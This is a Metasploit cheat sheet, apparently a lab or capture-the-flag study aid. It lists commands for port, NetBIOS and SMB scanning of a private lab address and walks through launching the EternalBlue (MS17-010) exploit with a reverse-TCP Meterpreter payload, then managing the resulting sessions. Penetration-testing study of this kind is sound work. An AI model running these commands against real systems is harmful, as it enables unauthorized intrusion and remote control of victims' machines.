# 🚀 Metasploit Cheat Sheet

## 🔎 Scanning & Enumeration

### Search Modules

```bash
search portscan
search netbios
search smb
```

### TCP Port Scanner

```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.40.235
run
```

### NetBIOS Name Scanner

```bash
use auxiliary/scanner/netbios/nbname
set RHOSTS 10.10.40.235
run
```

### Enumerate SMB Users

```bash
use auxiliary/scanner/smb/smb_enumusers
set RHOSTS 10.10.40.235
run
```

## 💥 Exploitation

### Search Exploit

```bash
search ms17_010
```

### Use EternalBlue Exploit

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

### Show Compatible Payloads

```bash
show payloads
```

### Select Payload

```bash
set payload windows/x64/meterpreter/reverse_tcp
```

### Configure Payload Options

```bash
set LHOST <your IP>
set LPORT 4444
```

### Run Exploit

```bash
exploit
```

## 🖥 Session Management

### List Active Sessions

```bash
sessions
```

### Interact with a Session

```bash
sessions -i 1
```

### Background a Session

```bash
CTRL+Z  # Then confirm with y
```

### Close Session

```bash
sessions -k 1
```

## 📝 Notes

- ✅ Always run `show options` after setting modules to verify required parameters.
- ✅ Use `info <module>` to see detailed descriptions, targets, references, and usage notes.
- ✅ For persistent shells, prefer `meterpreter` payloads.
- ✅ Example common payloads:
    - `windows/meterpreter/reverse_tcp`
    - `generic/shell_reverse_tcp`